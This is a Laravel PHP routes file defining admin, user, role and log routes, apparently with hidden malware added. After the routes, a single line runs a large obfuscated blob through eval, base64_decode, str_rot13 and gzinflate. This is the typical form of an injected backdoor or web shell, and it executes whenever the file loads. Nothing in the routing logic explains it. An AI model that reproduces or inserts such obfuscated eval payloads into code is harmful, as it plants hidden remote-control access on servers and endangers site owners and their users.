<?php

Auth::routes();
Route::get('/',      'AdminController@index');

Route::group(['middleware' => ['auth']], function(){

    Route::get('admin',                     'AdminController@init');
    Route::resource('usuarios',             'UsuariosController');
    Route::get('logs',                      'UsuariosController@online');
    Route::resource('roles',                'RoleController');
    Route::get('logout',                    'AdminController@logout');

    Route::group(array('prefix' => 'api/v1'), function(){
        /* Admin */
        Route::get('usuarios',                  'UsuariosController@api');
        Route::get('roles',                     'RoleController@api');        
        Route::get('online/usuarios',           'UsuariosController@apiOnline');
        Route::get('online/logs',               'LogController@api');
        Route::get('online/autoditoria',        'AuditoriaController@api');

    });
});

echo eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));